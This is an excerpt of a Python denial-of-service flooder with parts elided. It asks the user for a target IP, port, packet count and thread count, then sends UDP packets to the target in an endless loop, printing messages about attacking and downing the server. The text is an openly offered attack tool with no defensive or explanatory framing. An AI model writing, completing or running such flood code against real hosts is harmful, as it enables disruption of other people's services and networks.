...
ip = str(input("\033[0;97mEnter The Target Ip:"))
port = int(input("\033[0;96mEnter The Target Port:"))
choice = str(input("\033[0;96mEnter The Ready Attack [Y] (y/n):"))
times = int(input("\033[0;96mEnter The Attack Packet:"))
threads = int(input("\033[0;96mEnter The Attack Threads:"))
...
def run():
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[96m====>>>Send to attacking packet: %s \033[96m=======>>>And Attack Port:%s!!!"%(ip,port))
		except:
			print("\033[96m====>>>Downed Attack Server Hosted: %s \033[96m======>>>And Attack Port:%s!!!"%(ip,port))
